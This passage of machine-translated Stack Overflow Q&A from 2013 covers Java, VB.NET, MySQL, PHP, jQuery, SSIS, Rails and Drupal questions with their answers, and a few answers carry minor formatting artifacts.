foreach (GetBooksRow row in dt.Rows)
{
    //logic
} 
```

我已经做了很多工作`DataSets`，我强烈建议不要使用它们，但我希望这会给你指明正确的方向。

# java - Java解析Oracle解释计划

> ID：15154748
> 
> 赞同：3
> 
> 时间：2013-03-01T09:46:59.070
> 
> 标签：java, sql, oracle, jdbc, sql-execution-plan

我想知道是否有任何库可以将 oracle 的解释计划解析为数据结构。

给定以下查询：

```
 select prod_category, avg(amount_sold)
 from sales s, products p
 where p.prod_id = s.prod_id
 group by prod_category; 
```

解释计划可能如下所示：

```
 ------------------------------------------
  Id   Operation              Name   
 ------------------------------------------
    0  SELECT STATEMENT              
    1   HASH GROUP BY                
    2    HASH JOIN                   
    3     TABLE ACCESS FULL   PRODUCTS
    4     PARTITION RANGE ALL        
    5      TABLE ACCESS FULL  SALES  
 ------------------------------------------ 
```

我想要一个解析器，将计划解析为允许可视化和分析计划的数据结构，如下所示：

```
 SELECT STATEMENT
        |
     GROUP BY
        |
       JOIN
   _____|______
  |            |
 ACCESS     ACCESS
 (PRODUCTS) (SALES) 
```

我注意到 Oracle 的[SQLDeveloper](http://www.oracle.com/technetwork/developer-tools/sql-developer/overview/index.html)将计划可视化。我不愿意手动解析文本，所以我想知道是否有任何库可以帮助解析计划。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T10:16:04.237

计划已经存储为层次结构以便于可视化：

```
 select 
    id, 
    parent_id, 
    lpad(' ', 2*(level-1), ' ')||operation||' '||object_name as desc
  from your_plan_table
  start with parent_id is null 
  connect by prior id = parent_id 
```

这种结构如何更方便？

# vb.net - 从数据表中选择值

> ID：15154749
> 
> 赞同：0
> 
> 时间：2013-03-01T09:47:03.170
> 
> 标签：vb.net, linq, datatable

我有一个`datatable`显示在`DataGridView`.

我希望用户在 中选择一个值，`datagridview`并将该值用作过滤器以在 中查找另一个值`datatable`。

所以像：

```
SELECT col2 from DataTable2 where col1= 
(value in selected cell of the DataGridView) 
```

**编辑**

好的，我添加了一些额外的信息，因为我不确定我问的是正确的问题：

我在下面有一个工具提示`datagridview`：

```
Sub dataGridView1_CellFormatting(ByVal sender As Object, _
    ByVal e As DataGridViewCellFormattingEventArgs) _
    Handles DataGridView1.CellFormatting

    If e.ColumnIndex = Me.DataGridView1.Columns("Last Stop").Index _
        AndAlso (e.Value IsNot Nothing) Then

        With Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex)

            .ToolTipText = '(THIS IS WHERE I'M STUCK)

        End With

    End If

End Sub 
```

我在上面停留的一点是我想在其中使用值`Last Stop`以便`e.Value`在我的 DataTable 中查找名称 -

> ToolTipSN.Tables("DT_ToolTip")

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:02:40.523

如果您想要严格比较，区分大小写和精确的单词：

```
Dim selectedCells = DataGridView1.SelectedCells.Cast(Of DataGridViewCell)()
If selectedCells.Any Then
    Dim filteredRows = From row In datatable2
       Join cell In selectedCells On row.Field(Of String)("col2") Equals cell.Value
       Select row
    ' either use For Each to enumerate the result:
    For Each row In filteredRows
        Dim col2 = row.Field(Of String)("col2")
        ' ...
    Next
    ' or use filteredRows.CopyToDataTable to create  a new DataTable from the result
End If 
```

如果您想允许任何选定的单元格并且不区分大小写（没有连接效率较低）：

```
Dim filteredRows = From row In datatable2
    Where selectedCells.Any(Function(c) StringComparer.OrdinalIgnoreCase.Equals(c.Value, row("col2"))) 
```

如果要允许任何选定的单元格，不区分大小写，并且部分单词需要匹配：

```
Dim filteredRows = From row In datatable2
    Where selectedCells.Any(Function(c) CStr(c.Value).
        IndexOf(row.Field(Of String)("col2"), StringComparison.OrdinalIgnoreCase) > -1) 
```

# mysql - 将值从多个表中插入到表中

> ID：15154751
> 
> 赞同：0
> 
> 时间：2013-03-01T09:47:08.457
> 
> 标签：mysql, database, join, insert, foreign-keys

我正在尝试将值从多个表中插入到表中，

我的桌子看起来像这样。

**Meter_detail**

*   Meter_id（主键）
*   米号。
*   仪表名称

**Parameter_details**

*   parameter_id（主键）
*   参数名称
*   地址

**仪表数据**

*   时间戳
*   米号。
*   地址
*   价值

我需要一个如下所示的具有所有关系的表。

**主表**

*   S_no（主键和自增）
*   Meter_id（外键）
*   parameter_id（外键）
*   约会时间
*   价值

我尝试了一个不起作用的查询，它只是显示查询正在执行......

```
insert into main_table(meter_id,parameter_id,datetime,value)
select meter_detail.meter_id,parameter_detail.parameter_id,meter_data.Time_stamp,meter_data.value
from meter_data,
meter_detail ,
parameter_detail; 
```

我该怎么做呢。谢谢

# php - 如何让我的用户以特定格式插入日期？

> ID：15154755
> 
> 赞同：0
> 
> 时间：2013-03-01T09:47:12.343
> 
> 标签：php, date

在内部 CMS/订单系统中，我们有一个“截止日期”输入字段。目前这只是一个纯文本并存储在数据库（varchar）中。我想改变这一点，因为我无法以任何方式*处理*这些数据。输入应该是日期（日-月-年）。

做这个的最好方式是什么？我想出的解决方案：

1.  使用 HTML5 的`<input type="date" />`. 这可以工作，因为我们只在内部使用现代浏览器。
2.  jQuery 日期选择器。我以前没有真正使用过 jQuery，但我认为这是一个可靠的解决方案。
3.  让用户随心所欲地使用`strtotime()`？

关于如何处理这个问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:51:47.767

我的简单建议是，

您可以在文本框下方给出标签文本，例如**注意：日期格式应为“dd-mm-yyyy” 。**

然后您可以验证 Javascript 和 PHP 中的输入格式。有很多可用的验证脚本。

（或者）

使用**Datepicker**以方便用户使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:08:21.997

我认为您可以使用 jquery 日期选择器，因为它更加用户友好并且保持日期选择器只读，无需进一步验证日期。您还可以更改所需的日期格式。

供参考检查这些链接

[http://jqueryui.com/datepicker/](http://jqueryui.com/datepicker/)

[http://keith-wood.name/datepick.html](http://keith-wood.name/datepick.html)

# javascript - window.parent.$() 在 IE 中不起作用

> ID：15154757
> 
> 赞同：1
> 
> 时间：2013-03-01T09:47:20.063
> 
> 标签：javascript, jquery, internet-explorer, iframe, browser

我不明白下面的代码片段，它在 chrome 中完美运行（尚未在 ff 中测试）但它在 IE 中出现错误，指出“无效参数”，有什么办法可以解决这个问题吗？

```
window.parent.$('#tdDealItem').append($wrap); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:49:03.043

您是否尝试过取出“窗口”部分并仅使用`parent.$('#tdDealItem').append($wrap);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:49:39.910

试试这个，

```
$(w.document.body).$('#tdDealItem').append($wrap); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-24T13:24:43.010

Silverlight 的 WebBrowser 控件形式的 IE-embedded-in-Silverlight 也有同样的问题。

修复有点奇怪，我不确定我理解*为什么*，但是，将我的解决方案应用到您的解决方案中，这只是`parent.jQuery`放入它自己的变量的情况，即：

```
var parentjq = parent.jQuery;
parentjq("#tdDealItem").append($wrap); 
```

出于某种原因，IE-in-SL 不喜欢语法`parent.jQuery(...).`，给我“对象不支持方法 'jQuery' 的这个属性”。

值得注意的是，这只发生在 IE-in-SL 中：在 IE7 浏览器模式下运行 IE7 strict 的 IE 没有出现同样的问题。但是YMMV。

为了好奇（和完整性），我遇到了问题/错误消息：

```
var fldid = parent.$("body").data("dateFieldId"); 
```

但拆分后：

```
var parentjq = parent.jQuery;
var fldid = parentjq("body").data("dateFieldId"); 
```

错误消失了，我得到了正确的结果。

# php - 使用 PHP 为每个 img 添加父级

> ID：15154761
> 
> 赞同：4
> 
> 时间：2013-03-01T09:47:37.983
> 
> 标签：php, javascript, jquery, html, dom

我想用 PHP 为每个 img 添加父级。我可以`wrap()`在 jQuery 中做到这一点，但我不知道如何使用 PHP。

**HTML：**

```
<div id="main">
  <img src="..." />
  <img src="..." />
  <img src="..." />
  <img src="..." />
</div> 
```

**JS：**

```
$("#main img").each(function(){ $(this).wrap('<div class="photo" />'); }); 
```

**结果 HTML：**

```
<div id="main">
  <div class="photo"><img src="..." /></div>
  <div class="photo"><img src="..." /></div>
  <div class="photo"><img src="..." /></div>
  <div class="photo"><img src="..." /></div>
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:50:58.143

[简单的 HTML DOM](http://simplehtmldom.sourceforge.net/)可能是您的答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T11:02:25.337

您可以使用我在下面创建的功能来做到这一点。

```
<?php
$page = '
    <body>
        <div id="main">
            <img src="..." />
            <img src="..." />
            <img src="..." />
            <img src="..." />
        </div>
    </body>
';

echo $page = wrapImg ( $page, 0 );

function wrapImg ( $page, $offset )
{
    if ( FALSE !== ( $startImg = strpos( $page, '<img', $offset ) )
      && FALSE !== ( $endImg = strpos( $page, '/>', $startImg ) )
    ) {
        $before = '<div class="photo">';
        $after = '</div>';

        $start = substr( $page, 0, $startImg );
        $img = substr( $page, $startImg, $endImg+2-$startImg );
        $end = substr( $page, $endImg+2);

        $page = $start . $before . $img . $after . $end;
        $length = ($startImg + strlen( $before . $img . $after )-1);

        $page = wrapImg ( $page, $length );
    }

    return $page;
}
?> 
```

结果将是：

```
 <body>
        <div id="main">
            <div class="photo"><img src="..." /></div>
            <div class="photo"><img src="..." /></div>
            <div class="photo"><img src="..." /></div>
            <div class="photo"><img src="..." /></div>
        </div>
    </body> 
```

# java - 这个符号是什么：MyClassName 在 Java 中是什么意思？

> ID：15154769
> 
> 赞同：1
> 
> 时间：2013-03-01T09:48:06.343
> 
> 标签：java, twitter

Twitter 发布了一个 Java 客户端库，并包含以下使用它的示例代码：

```
// Connect to the filter endpoint, tracking the term "twitterapi"
Hosts host = new BasicHost(Constants.STREAM_HOST);
StreamingEndpoint endpoint = new StatusesFilterEndpoint();
endpoint.trackTerms(Lists.newArrayList("twitterapi"));

// Drop in the oauth credentials for your app, available on dev.twitter.com
Authentication auth = new OAuth1("consumerKey", "consumerSecret", 
                             "token", "tokenSecret");

// Initialize a queue to collect messages from the stream
BlockingQueue<String> messages = new LinkedBlockingQueue<String>(100000);

// Build a client and read messages until the connection closes.
ClientBuilder builder = new ClientBuilder()
    .name("FooBarBaz-StreamingClient")
    .hosts(host)
    .authentication(auth)
    .endpoint(endpoint)
    .processor(new StringDelimitedProcessor(messages));
Client client = builder.build;
client.connect();

while (!client.isDone()) {
  String message = messages.take();
  // Do something with message
} 
```

发布公告： [https ://dev.twitter.com/blog/the-hosebird-client-streaming-library](https://dev.twitter.com/blog/the-hosebird-client-streaming-library)

尖括号是什么意思？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:58:35.397

`BlockingQueue<String>`Collection的超级接口之一。这意味着它实现了的功能，`java.util.Collection`它使您可以使用泛型并使集合cast-save！使用通用：

```
BlockingQueue<String> 
```

您只能在 BlockingQueue 中使用 String。尝试添加另一个值，您的 IDE 会通知您不匹配的情况。这是一个很大的好处，因为检查不是在应用程序运行时完成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:59:38.200

这意味着它`messages`是一个`LinkedBlockingQueue`适用于类型对象的实例`String`。另一个例子参见 java 的 HashMap，关于 java 中泛型的简要介绍参见[wikipedia 。](http://en.wikipedia.org/wiki/Generics_in_Java)

# java - 在 Java 中从调用者或在它调用的方法中进行所有必要的检查是否更好？

> ID：15154771
> 
> 赞同：21
> 
> 时间：2013-03-01T09:48:12.533
> 
> 标签：java, validation, exception

让我们看看这两个例子。

**第一的：**

```
try {
    execute(testObj);
} catch(Exception e) {
    //do somethingwith that
}

public void execute(TestObj testObj) throws Exception {
    if (testObj == null){
        throw new Exception("No such object");
    }
    //do something with object
} 
```

**第二：**

```
if (testObj != null){
    execute(testObj);
} else {
    //handle this differently
}

public void execute(TestObj testObj) {
    //do something with object
} 
```

如果我们需要检查“is null”或其他任何内容，这不是现在的重点。我想知道哪种做法总体上更好——“*检查，然后执行*”或“*执行，如果发生则处理异常*”？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-03-01T11:38:01.537

也不，您应该只检查**系统之间的边界**。

系统之间的界限是什么？

1.  当您收到用户的输入时，
2.  当您读取文件、网络或套接字时，
3.  当您进行系统调用或进程间通信时，
4.  在库代码中，在所有面向公众的 API 中。
5.  等等

在库代码中，由于公共 API 可能被外部代码调用，因此您应该始终检查任何可以被外部代码调用的内容。无需检查仅限内部的方法（即使其访问修饰符是公共的）。然后，根据个人喜好，参数错误可能会通过异常或返回码发出信号，但是检查异常不能被忽略，因此它通常是向外部代码发出错误信号的首选方法。

在应用程序代码（相对于库）中，只应在接收用户输入、加载 URL、读取文件等时进行检查。在公共方法中无需进行输入检查，因为它们只是曾经被您自己的应用程序代码调用过。

在您自己的代码中，您应该**避免首先需要检查的情况**。例如`null`，您可以使用[“空对象模式”](https://en.wikipedia.org/wiki/Null_Object_pattern)而不是检查。如果您仍然需要进行检查，请尽早进行，这通常意味着在外面进行，但要尝试找到更早的点。

即使没有正式写下来，即使没有强制执行，所有方法，无论是内部的还是面向公众的，都应该有一个[契约](https://en.wikipedia.org/wiki/Design_by_contract)。不同之处在于，在面向外部的代码中，您应该将合约作为错误检查的一部分来执行，而在仅限内部的代码中，您可以并且应该依赖调用者知道要传递什么和不传递什么。

简而言之，由于仅在系统边界上进行检查，**如果您实际上可以选择**是在方法内部还是外部进行检查，那么您可能不应该在那里进行检查，因为**那不是系统边界**。

在系统边界中，**双方总是要检查**. 调用者必须检查外部调用是否成功，而被调用者必须检查调用者是否提供了合理的输入/参数。忽略调用者中的错误几乎总是一个错误。[健壮性原则](https://en.wikipedia.org/wiki/Robustness_principle)适用，始终检查您从外部系统收到的所有内容，但只发送您知道外部系统可以肯定接受的内容。

但是，在非常大的项目中，通常需要将项目划分为小模块。在这种情况下，项目中的其他模块可以被视为外部系统，因此您应该检查暴露给项目中其他模块的 API。

**TLDR；**检查是困难的。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-01T14:55:00.147

正如@LieRyan 所说，**您应该只检查系统之间的边界。**但是一旦你进入了自己的代码，你仍然需要能够检测到意想不到的问题，主要是因为：

*   您（和您的同事）并不完美，可能会将 null 传递给无法处理它的方法。
*   如果一行使用两个对象并且一个为空，则 NPE 不会告诉您应该归咎于哪一个 (System.out.println ("a.getName() " + "b.getName()") throws NPE...is a null 或 b null 或两者兼而有之？）

清楚地记录哪些方法接受 null 作为参数，或者可能返回 null。
如果您使用的是 Eclipse Juno，一个可以帮助您的好工具（我认为 IntelliJ-Idea 有类似的东西）是启用空检查分析。它允许您编写一些注释来进行编译时空检查。真是太棒了。你可以写类似

```
public @NonNull String method(@Nullable String a){
//since a may be null, you need to make the check or code will not compile
    if(a != null){
        return a.toUppercase();        
    }
    return ""; //if you write return null it won't compile, 
     //because method is marked NonNull 
} 
```

它还有一个很好的@NonNullByDefault，它基本上说“没有方法接受或返回null，除非标记为@Nullable”这是一个很好的默认值，可以让你的代码保持干净和安全。

有关更多信息，请查看[Eclipse 帮助](http://help.eclipse.org/juno/index.jsp?topic=%2Forg.eclipse.jdt.doc.user%2Ftasks%2Ftask-using_null_annotations.htm)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-01T09:57:36.123

我会说这取决于异常的类型。如果异常归结为无效参数，请在方法中检查它们。否则，留给调用者处理。

例子：

```
public void doSomething(MyObject arg1, MyObject arg2) throw SomeException {
   if (arg1==null || arg2==null) {
       throw new IllegalArgumentException(); //unchecked
   }
   // do something which could throw SomeException
   return;
} 
```

调用：

```
try {
    doSomething(arg1, arg2);
} catch (SomeException e) {
    //handle
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-03-01T10:04:49.087

这取决于。这两种方法都足够好。当您的功能将被其他客户使用时，首先是好的。在这种情况下，您的检查可以防止由于非法参数而导致的失败。作为作者，您保证您的代码即使在出现意外错误输入参数的情况下也能正常工作。当您不是该函数的作者或不想处理该方法抛出的异常时，可以使用第二个。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-03-01T10:12:11.250

根据**第 38 条**`Joshua Bloch` `Effective Java Second Edition`，在方法**内部**检查参数的有效性是更好的方法。所以，第一种方法要好得多，除了事实是，在这种情况下，你必须基本上抛出，即： ****`public``NullPointerException``RuntimeException`****

 ****```
// do not need try...catch due to RuntimeException
execute(testObj);

public void execute(TestObj testObj) {
    if (testObj == null){
        throw new NullPointerException("No such object");
    }
    ;//do smth with object
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-01T09:54:28.430

第二个和第一个一样好，任何异常都可能触发，你会认为这是意料之中的。

请记住，使用异常来控制程序流的计算成本很高，因为构建异常会降低性能。例如，在休眠状态下，最好`SELECT COUNT(*)`检查一行是否存在，而不是查看 recordNotFoundException 是否触发并将应用程序逻辑基于该异常触发。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-03-01T09:57:26.210

第二种方法更好，因为它更易于阅读和维护。

您还应该记住，抛出异常有时只会将您的问题从 A 转移到 B，并且不能解决问题。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-03-01T09:58:24.520

最好从调用者那里进行，因为您可以，例如，如果数据是从用户那里提供的，如果它们不合适，则可以请求新数据，或者如果数据不好，则不调用该函数。因此，您可以保持您的方法“干净”，并且某些方法只会执行它的简单目的功能。因此，它将更容易在其他领域转移和重复使用。你可以，如果提供给方法的数据抛出异常。

**例如**，如果它是一种将数据写入文件的方法，并且它获取文件路径作为输入。你可以抛出`FileNotFound`异常。

这样，使用您的方法的程序员将知道他必须提供正确的文件路径并事先进行所有必要的检查。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2013-03-01T10:13:01.810

## 按目的：

如果您正在创建一个库，那么您只是提供 API，而不是一些可运行的代码。您不知道用户是否会从调用者那里进行检查，因此您可以（不一定，有时 if 语句可以完成工作）从您的方法中抛出异常以确保稳健性。

如果您正在创建应用程序，则第二种方法要好得多。仅将 try-catch 子句用于检查简单条件是一种不好的做法。

事实上，异常抛出语句和 if-checks 可以共存，我推荐它。但是在您的代码中，您应该尽可能避免引发异常。

* * *

## 按用途：

**当某些情况不是预期但可能发生时，会引发***异常。***通常它对调试很有用，因为您可以通过评估`Exception`实例来跟踪堆栈。**

 *****if 子句***在所有情况下都很有用。事实上，`throw`语句通常包含在`if`子句中。这意味着您不想（或不能）处理这种情况，只需将其留给调试器（异常管理器）即可。或者，您可以随心所欲地编写代码。

* * *

在大多数情况下，您希望处理所有情况，尽管有些情况不太可能发生。正如我所说，尝试抛出尽可能少的异常，不仅是出于性能考虑，也是为了方便使用。

一个（坏的）例子表明有时异常是浪费的：

```
public void method1 () throws Exception1, Exception2 {
    if (condition) {
        throw new Exception1("condition match");
    } else {
        throw new Exception2("condition mismatch");
    }
}

public void method2 () {
    try {
        method1();
    } catch (Exception1 e1) {
        // do something
    } catch (Exception2 e2) {
        // do something
    }
} 
```

通常，您不会编写这样的代码，但正如您所见，一个方法被分成两个，而 method1 几乎什么都不做。与您的第一个示例相同，切勿将属于一个方法的代码拆分到不同的地方。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-03-01T10:00:38.050

例外应该用于`exceptional conditions`; 你不希望发生的事情。验证输入并不是很特别。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-03-01T16:10:15.780

只要有可能，就应该努力确保如果从方法中抛出异常，失败的操作将没有副作用。虽然在 Java 或 .net 中没有标准方法可以通过它来指示异常表示它表示“干净的无副作用故障”，但在许多情况下（例如，尝试反序列化数据结构）很难预测所有类型的故障都可能发生（例如，由于尝试加载损坏的文件），但几乎所有类型的无副作用故障都可以以相同的方式处理（例如，通知用户无法加载文档，很可能是因为它已损坏或格式错误）。

即使一个方法只在自己的代码中使用，在对参数做任何可能对其他代码产生不利影响的事情之前验证参数通常是好的。例如，假设代码使用了一个惰性排序列表（即，它保留了一个可能已排序或未排序的列表，以及一个指示它是否已排序的标志）；将项目添加到列表时，它只是将其附加到末尾并设置“需要排序”标志。如果给定一个空引用或一个无法与列表中的项目进行比较的对象，“添加项目”例程可能会“成功”完成，但添加这样一个项目会导致以后的排序操作失败。即使“添加项目”方法不必关心项目是否有效，“添加项目”会好得多

然后是故障排除代码，如果方法`foo`接收到将立即传递给`bar`并导致`bar`抛出的参数值，则抛出异常`foo`而不是`bar`可能会有所帮助，但异常最终会立即抛出的场景基本上没有副作用 - 即使通过嵌套方法 - 远不如`foo`在引发异常之前会导致一些副作用的场景重要，或者 - 更糟糕的是 - “正常”完成但导致未来操作失败.******

# jquery - 在悬停时使用 on() - jQuery

> ID：15154773
> 
> 赞同：0
> 
> 时间：2013-03-01T09:48:16.547
> 
> 标签：jquery, hover

这就是我所拥有的：

```
$('#blah').hover(function(){
    $('etc').show();
}, function(){
    $('etc').hide();
}); 
```

这工作得很好，现在我希望上面的代码与 on() 方法一起工作：

```
$('#blah').on('hover', function(){
    $('#etc').show();
}, function(){
    $('#etc').hide();
}); 
```

但这不起作用，有人知道为什么吗？但这也有效：

```
$('#blah').on('hover', function(){
    $('#etc').show();
}); 
```

当我使用 on() 方法时，回调函数不起作用，所以我将 mouseover() 和 mouseleave() 与 on() 一起使用并且它正在工作，我只是想知道为什么悬停回调不起作用 on ()，这比使用 2 个事件要简单得多......

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:54:22.547

来自 Jquery 文档。[jQuery on](http://api.jquery.com/on/#additional-notes)

> 自 jQuery 1.8 起已弃用：名称“hover”用作字符串“mouseenter mouseleave”的简写。它为这两个事件附加了一个事件处理程序，处理程序必须检查 event.type 以确定事件是 mouseenter 还是 mouseleave。不要将“悬停”伪事件名称与接受一两个函数的 .hover() 方法混淆。

```
$("div.test").on({
  mouseenter: function(){
    $(this).addClass("inside");
  },
  mouseleave: function(){
    $(this).removeClass("inside");
  }
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T10:05:39.943

从[JQuery](http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js)源码来看，`hover`不包含在触发导致JQuery的事件列表中`.on()`

```
jQuery.each( ("blur focus focusin focusout load resize scroll unload click dblclick " +
    "mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " +
    "change select submit keydown keypress keyup error contextmenu").split(" "), function( i, name ) {

    // Handle event binding
    jQuery.fn[ name ] = function( data, fn ) {
        return arguments.length > 0 ?
            this.on( name, null, data, fn ) :
            this.trigger( name );
    };
}); 
```

这是因为`.hover()`它只是 JQuery`.mouseenter()`和`.mouseleave()`

```
jQuery.fn.hover = function( fnOver, fnOut ) {
    return this.mouseenter( fnOver ).mouseleave( fnOut || fnOver );
}; 
```

我希望这个简短的解释提供很少的指导。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T09:51:25.620

使用 mouseenter 和 mouseleave 进行悬停。[在此处](https://stackoverflow.com/questions/9827095/is-it-possible-to-use-jquery-on-and-hover)使用悬停检查。

```
$("#blah").on(
{
    mouseenter: function() 
    {
        //stuff to do on mouseover
    },
    mouseleave: function()
    {
        //stuff to do on mouseleave
    }
}); 
```

使用切换显示/隐藏，

```
$('#blah').on('hover', function(){
    $('#etc').toggle();
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T09:52:02.747

这是因为`hover`它不是真正的浏览器事件，实际上它只是调用的简写

```
 $(selector).mouseenter(handlerIn).mouseleave(handlerOut); 
```

从 1.8 版开始，[不推荐](http://api.jquery.com/on/#additional-notes)使用`.on('hover')`表单。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T09:50:26.190

采用

```
 jQuery.on("hover","#blah", function..) 
```

或者你也可以使用 jQuery 的切换功能

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T09:51:06.643

是的，它不起作用，因为当您使用`.on()`then`hover`事件`hover`时，只有一个回调函数，而不是您可以在`.on()`

尝试

```
$("DOM").on({
    mouseenter: function() {
        // Handle mouseenter...
    },
    mouseleave: function() {
        // Handle mouseleave...
    }
}); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-01T09:52:04.780

使用切换（）

```
$('#blah').on('hover', function(){
   $('#etc').toggle();
}); 
```

# sql-server-2008 - 不支持 SSIS Version100 数据库兼容级别错误

> ID：15154776
> 
> 赞同：2
> 
> 时间：2013-03-01T09:48:32.417
> 
> 标签：sql-server-2008, ssis

我正在使用 SQL Server 2008 R2 (Visual Studio 2008) 附带的 BIDS 来设计一个 SSIS 包，以使用传输 SQL Server 对象任务将对象从 SQL Server 2008 R2 服务器传输到另一个 SQL Server。

源数据库的兼容级别为 2008 (100)。目标是具有 2008 兼容数据库的 SQL Server 2012。当我执行组件时，虽然我收到错误消息：

> SSIS 包“Package.dtsx”启动。信息：传输 SQL Server 对象任务中的 0x4002F418，传输 SQL Server 对象任务：没有要传输的登录名。信息：传输 SQL Server 对象任务中的 0x4002F41D，传输 SQL Server 对象任务：没有要传输的用户。错误：传输 SQL Server 对象任务中的 0xC002F325，传输 SQL Server 对象任务：执行失败，出现以下错误：“不支持版本 100 数据库兼容级别。”。

我检查了传输 SQL Server 对象任务的程序集版本，它是版本 10。为什么我会收到此错误消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:39:20.810

我不认为您可以开发一个包并在 2008 引擎上运行它以将对象从 2008 年传输到 2012 年，因为即使目标数据库与 2008 兼容，登录也处于“实例级别”并且实例是 2012。

我建议你尝试在2012引擎上开发一个运行包，并从2008年拉到2012年的主体

# ruby-on-rails - 使用 Unicorn、Nginx 生产 Rails 开发错误

> ID：15154777
> 
> 赞同：1
> 
> 时间：2013-03-01T09:48:35.057
> 
> 标签：ruby-on-rails, nginx, unicorn

我们有几个使用报告错误的例子，他们在我们的网站上看到了 Rails 的开发类型错误页面——他们发送了屏幕截图。

在所有情况下，错误本身都不是要解决的问题，但我从未能够重现会显示开发错误页面的错误。例如，在一种情况下，它是一个模板错误“no method '<' for nil”，所以我设置了一个会复制该错误的秘密路由，但是当我尝试它时，它只显示了 500.html 的内容。

我已经确认所有应用服务器都在生产模式下运行。

Rails 的版本是 3.1.10，运行在 Nginx 0.7.65 上。SO上有一个类似的帖子，但它与Phusion Passenger有关。

抱歉，这里没有太多信息可以继续。

更新：SSL 总是会发生这种情况如果我通过编辑我的主机文件直接访问其中一个应用程序服务器，我会得到正确的 500.html，但是在正常查看时（通过负载均衡器）会出现开发类型错误。

这是我的 nginx 配置：gist.github.com/davidnorth/5063830

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T19:34:23.843

我最终在初始化程序中使用了这个解决方法。这对开发没有影响。

```
class ActionDispatch::Request
 def local?
   false
 end
end 
```

# java - Java - 2darray.length：如何通过列而不是行进行循环？

> ID：15154781
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:48:44.947
> 
> 标签：java, arrays, multidimensional-array, symmetric

```
 public static int[] getMinimumSymmetricOfEveryRow (int [][] A)
{
    int min = Integer.MAX_VALUE;
    int[] arr=new int[A.length];
    for (int i = 0; i < A.length; i++){
        for (int j = 0; j < A[i].length; j++){
            if (A[i][j] < min && isSymmetric(A[i][j])){
                arr[i] = A[i][j];
                }
        }
    }
    return arr;
} 
```

这是我的函数，它从二维数组的每一行返回最小对称元素数组。它适用于 array[n][n]，但不适用于 array[m][n]...（它返回 m 元素而不是 n）。不知道是什么问题？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:30:31.637

假设输入数组的格式为 [row][column] 并且方法应该是*getMinimumSymmetricOfEveryColumn*，您可以将方法编写为：

```
 public static int[] getMinimumSymmetricOfEveryColumn(int[][] matrix) {
    int[] columnMinimum = new int[matrix[0].length];
    for (int colimnIndex = 0; colimnIndex < matrix[0].length; colimnIndex++){
        int currentMinimum = Integer.MAX_VALUE;
        for (int rowIndex = 0; rowIndex < matrix.length; rowIndex++){
            int currentElement = matrix[rowIndex][colimnIndex];
            if (currentElement < currentMinimum && isSymmetric(currentElement)){
                columnMinimum[colimnIndex] = currentElement;
            }
        }
    }
    return columnMinimum;
} 
```

# drupal - drupal 7新创建的自定义模块未显示在模块列表中

> ID：15154782
> 
> 赞同：0
> 
> 时间：2013-03-01T09:48:52.187
> 
> 标签：drupal, drupal-7

我是drupal的新手，目前正在学习drupal 7。

我指的是 drupal 7 的书

我试图创建我的第一个自定义模块

在书中提到您可以在以下目录之一中创建模块

1）/站点/所有/模块

2) /sites/default/modules

我的模块名称是**第一个**

我在 /sites/default/modules/first 中创建了我的模块

在这个目录中有两个文件

1)**第一信息**

2) **first.module**

第一个 .info 文件的内容是

```
;$Id$
name = First
description = A first module.
package = Drupal 7 Development
core = 7.x
files[] = first.module
;dependencies[] = autoload
;php = 5.4 
```

fisrt.module 文件的内容是

```
<?php
// $Id$
/**
* @file
* A module exemplifying Drupal coding practices and APIs.
*
* This module provides a block that lists all of the
* installed modules. It illustrates coding standards,
* practices, and API use for Drupal 7.
*/
/**
* Implements hook_help().
*/

function first_help($path, $arg) {
if ($path == 'admin/help#first') {
return t('A demonstration module.');
}
}
?> 
```

当我尝试检查模块列表时，我看不到我创建的模块

我已经厌倦了清除缓存并检查仍然没有显示

谁能告诉我哪里错了。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T11:33:42.683

**模块位置**
大多数人选择将模块放在`/sites/all/modules`or`/sites/domain.com/modules`文件夹中（而不是`sites/default...`）。对于最常见的 Drupal 安装，您应该将其放在`sites/all/modules`.

**信息文件 信息文件**
中仅需要名称、描述和核心。首先删除除这些值之外的所有内容。

```
name = First
description = A first module.
core = 7.x 
```

有关详细信息，请参阅[编写模块 .info 文件 (Drupal 7.x)](http://drupal.org/node/542202)。

